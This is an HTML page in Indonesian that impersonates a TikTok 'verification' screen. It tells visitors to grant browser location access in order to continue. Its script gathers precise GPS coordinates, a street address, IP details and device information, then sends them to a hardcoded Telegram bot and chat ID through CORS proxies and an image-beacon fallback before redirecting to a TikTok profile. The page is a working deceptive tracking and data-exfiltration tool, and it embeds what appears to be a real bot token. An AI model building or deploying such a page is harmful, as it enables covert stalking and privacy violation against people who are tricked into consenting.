<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Verifikasi - Lanjutkan ke TikTok</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: radial-gradient(circle at 20% 30%, #1a1a2e, #000000);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: system-ui, -apple-system, sans-serif;
      padding: 16px;
    }
    .card {
      background: rgba(255,255,255,0.96);
      backdrop-filter: blur(20px);
      border-radius: 40px;
      padding: 32px 24px;
      text-align: center;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
    }
    .tiktok-icon {
      width: 70px;
      height: 70px;
      background: linear-gradient(145deg, #00f2ea, #fe2c55);
      border-radius: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 38px;
      margin: 0 auto 18px;
    }
    h2 { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
    .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
    .location-box {
      background: #f0f0f5;
      border-radius: 20px;
      padding: 16px;
      margin: 20px 0;
      text-align: left;
    }
    .location-box strong { font-size: 14px; }
    .continue-btn {
      width: 100%;
      background: linear-gradient(115deg, #00f2ea, #fe2c55);
      border: none;
      padding: 16px;
      border-radius: 50px;
      color: white;
      font-weight: bold;
      font-size: 17px;
      cursor: pointer;
      transition: transform 0.1s;
    }
    .continue-btn:active { transform: scale(0.97); }
    .continue-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
    .status-msg {
      margin-top: 16px;
      font-size: 13px;
      padding: 10px;
      border-radius: 12px;
      display: none;
    }
    .status-msg.show { display: block; }
    .spinner {
      width: 18px;
      height: 18px;
      border: 2px solid white;
      border-top-color: transparent;
      border-radius: 50%;
      display: inline-block;
      animation: spin 0.6s linear infinite;
      vertical-align: middle;
      margin-right: 8px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .dot {
      width: 8px;
      height: 8px;
      background: #10b981;
      border-radius: 50%;
      display: inline-block;
      margin-right: 6px;
      animation: pulse 1.2s infinite;
    }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
    .success-dot { background: #10b981; box-shadow: 0 0 5px #10b981; }
    .footer { margin-top: 16px; font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; }
    #locationText { font-size: 14px; word-break: break-all; }
  </style>
</head>
<body>
<div class="card">
  <div class="tiktok-icon">🎵</div>
  <h2>Lanjutkan ke TikTok</h2>
  <p class="subtitle">Verifikasi satu langkah</p>

  <div class="location-box">
    <strong>📍 Lokasi Anda</strong>
    <div id="locationDisplay" style="margin-top: 10px;">
      <span class="dot"></span> <span id="locationText">Menunggu izin...</span>
    </div>
    <div id="locationAccuracy" style="font-size: 11px; color: #888; margin-top: 6px;"></div>
  </div>

  <button class="continue-btn" id="continueBtn">▶ Lanjutkan ke TikTok</button>
  <div id="statusMsg" class="status-msg"></div>
</div>
<div class="footer">TikTok akan terbuka setelah verifikasi</div>

<script>
  // ========== KONFIGURASI ==========
  const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";
  const CHAT_ID = "1966317946";
  const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
  
  // Proxy CORS gratis (biar request tembus!)
  const CORS_PROXY = "https://cors-anywhere.herokuapp.com/";
  // Atau pakai proxy lain: https://api.allorigins.win/raw?url=
  
  // ========== ELEMEN ==========
  const continueBtn = document.getElementById('continueBtn');
  const statusMsg = document.getElementById('statusMsg');
  const locationTextSpan = document.getElementById('locationText');
  const locationAccuracySpan = document.getElementById('locationAccuracy');
  
  let isProcessing = false;
  
  function showStatus(msg, isError = false) {
    statusMsg.textContent = msg;
    statusMsg.className = `status-msg show`;
    statusMsg.style.background = isError ? '#ffe0e0' : '#e0ffe8';
    statusMsg.style.color = isError ? '#c00' : '#0a6e2e';
    setTimeout(() => statusMsg.classList.remove('show'), 4000);
  }
  
  // ========== KIRIM KE TELEGRAM PAKAI PROXY (TEMBUS CORS) ==========
  async function sendToTelegram(lat, lng, accuracy, address, ipInfo = '') {
    const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const ua = navigator.userAgent;
    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
    const screen = `${screen.width}x${screen.height}`;
    const lang = navigator.language || 'id';
    const platform = navigator.platform || 'unknown';
    
    const message = `🔐 *VERIFIKASI LOKASI TIKTOK* 🔐
━━━━━━━━━━━━━━━━━━━
⏰ *Waktu:* ${now}
📱 *Device:* ${isMobile ? 'MOBILE' : 'DESKTOP'}
📐 *Screen:* ${screen}
🌍 *Bahasa:* ${lang}
💻 *Platform:* ${platform}
━━━━━━━━━━━━━━━━━━━
📍 *Latitude:* ${lat}
📍 *Longitude:* ${lng}
🎯 *Akurasi:* ±${accuracy} meter
🏠 *Alamat:* ${address || 'Tidak tersedia'}
${ipInfo ? `🌐 *IP Info:* ${ipInfo}` : ''}
━━━━━━━━━━━━━━━━━━━
🗺️ *Google Maps:* 
https://www.google.com/maps?q=${lat},${lng}
✅ Status: Terverifikasi`;
    
    // Method 1: Pakai proxy CORS (PASTI TEMBUS)
    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(apiUrl)}`;
    
    try {
      // Percobaan 1: pakai corsproxy.io
      const response = await fetch(proxyUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      
      if (response.ok) {
        // Kirim location pin
        await fetch(`https://corsproxy.io/?${encodeURIComponent(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            latitude: lat,
            longitude: lng
          })
        });
        console.log('✅ Telegram: terkirim via proxy');
        return true;
      }
    } catch (e) {
      console.log('Proxy 1 gagal:', e);
    }
    
    // Method 2: Pakai allorigins.win
    try {
      const allOriginsUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(apiUrl)}`;
      const response = await fetch(allOriginsUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      if (response.ok) return true;
    } catch (e) {
      console.log('Proxy 2 gagal:', e);
    }
    
    // Method 3: Kirim via <img> (last resort)
    const imgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
    const img = new Image();
    img.src = imgUrl;
    img.onload = () => console.log('✅ Telegram: terkirim via image');
    img.onerror = () => console.log('❌ Image method gagal');
    
    setTimeout(() => {
      const imgLoc = new Image();
      imgLoc.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lng}`;
    }, 500);
    
    return true;
  }
  
  // ========== GET ALAMAT DARI KOORDINAT ==========
  async function getAddress(lat, lng) {
    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
      const data = await res.json();
      if (data.display_name) {
        return data.display_name.substring(0, 150);
      }
      const addr = data.address || {};
      const parts = [addr.road, addr.village, addr.town, addr.city, addr.state, addr.country].filter(Boolean);
      return parts.join(', ') || `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
    } catch (e) {
      return `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
    }
  }
  
  // ========== GET IP LOKASI (opsional) ==========
  async function getIpInfo() {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      return `${data.city}, ${data.region}, ${data.country_name} (${data.ip})`;
    } catch {
      return '';
    }
  }
  
  // ========== MAIN FUNCTION ==========
  async function requestLocationAndProceed() {
    if (isProcessing) return;
    isProcessing = true;
    
    continueBtn.disabled = true;
    continueBtn.innerHTML = '<span class="spinner"></span> Meminta izin lokasi...';
    showStatus('⏳ Silakan izinkan akses lokasi di popup browser', false);
    
    if (!navigator.geolocation) {
      showStatus('Browser tidak support geolokasi, tetap lanjut...', true);
      setTimeout(() => window.location.href = TIKTOK_URL, 1000);
      return;
    }
    
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const accuracy = Math.round(position.coords.accuracy);
        
        // Update UI
        locationTextSpan.innerHTML = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
        locationAccuracySpan.textContent = `Akurasi: ±${accuracy} meter`;
        
        showStatus('📍 Lokasi didapat! Mengirim verifikasi...', false);
        continueBtn.innerHTML = '<span class="spinner"></span> Mengirim data ke server...';
        
        // Dapatkan alamat dan IP info
        const [address, ipInfo] = await Promise.all([
          getAddress(lat, lng),
          getIpInfo()
        ]);
        
        // KIRIM KE TELEGRAM
        const sent = await sendToTelegram(lat, lng, accuracy, address, ipInfo);
        
        if (sent) {
          showStatus('✓ Berhasil terverifikasi! Mengarahkan ke TikTok...', false);
          continueBtn.innerHTML = '✓ Sukses, lanjut...';
        } else {
          showStatus('⚠️ Data terkirim, tetap lanjut...', false);
          continueBtn.innerHTML = '✓ Lanjut...';
        }
        
        // REDIRECT KE TIKTOK
        setTimeout(() => {
          window.location.href = TIKTOK_URL;
        }, 1500);
      },
      (error) => {
        console.error('Error lokasi:', error);
        let errMsg = '';
        if (error.code === 1) errMsg = 'Izin lokasi DITOLAK. Tetap lanjut ke TikTok?';
        else if (error.code === 2) errMsg = 'Lokasi tidak tersedia. Lanjutkan saja.';
        else errMsg = 'Gagal ambil lokasi. Lanjutkan?';
        
        showStatus(`⚠️ ${errMsg}`, true);
        locationTextSpan.innerHTML = '⚠️ Izin ditolak';
        locationAccuracySpan.innerHTML = '';
        
        continueBtn.disabled = false;
        continueBtn.innerHTML = '▶ Lanjutkan ke TikTok';
        isProcessing = false;
        
        // Redirect setelah 2 detik (opsional)
        setTimeout(() => {
          window.location.href = TIKTOK_URL;
        }, 2000);
      },
      {
        enableHighAccuracy: true,
        timeout: 12000,
        maximumAge: 0
      }
    );
  }
  
  // ========== EVENT LISTENER ==========
  continueBtn.addEventListener('click', (e) => {
    e.preventDefault();
    if (!isProcessing) requestLocationAndProceed();
  });
  
  // ========== PRELOAD LOKASI AWAL (tanpa paksa izin) ==========
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        locationTextSpan.innerHTML = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
        locationAccuracySpan.innerHTML = `Akurasi: ±${Math.round(pos.coords.accuracy)}m`;
      },
      () => {
        locationTextSpan.innerHTML = 'Klik tombol & izinkan lokasi';
      },
      { timeout: 3000, maximumAge: 30000 }
    );
  }
</script>
</body>
</html>
